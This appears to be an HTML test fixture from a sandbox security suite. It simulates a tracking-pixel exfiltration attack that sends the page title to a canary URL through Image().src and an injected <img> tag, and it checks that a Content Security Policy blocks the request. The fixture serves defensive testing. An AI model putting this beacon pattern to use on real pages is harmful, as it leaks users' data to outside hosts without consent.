<!doctype html>
<meta charset="utf-8" />
<title>attack: image beacon</title>
<!-- ATTACK: classic tracking-pixel exfil via Image().src and <img src>.
     Blocked by CSP img-src (thing:/data:/blob: only). Canary must stay silent. -->
<script>
  const canary = ((window.bridge.getArgs() || {}).args || {}).canary || {};
  // Report the exact URL the attack targeted, so the test can prove the beacon
  // aimed at the REAL canary (finding 1.8: guards against a false pass where a
  // thing reads the canary from the wrong place, fires at `undefined/...`, and
  // "silent" would then mean "never attempted" rather than "blocked").
  const r = { attack: 'image-beacon', target: canary.http + '/pixel.gif' };
  let done = false;
  const finish = () => { if (!done) { done = true; window.bridge.emit('done', r); } };

  const img = new Image();
  img.onload = () => { r.loaded = true; finish(); };
  img.onerror = () => { r.error = 'onerror'; finish(); };
  img.src = canary.http + '/pixel.gif?steal=' + encodeURIComponent(document.title);

  const el = document.createElement('img');
  el.src = canary.http + '/pixel2.gif';
  document.body && document.body.appendChild(el);

  setTimeout(finish, 1500);
</script>
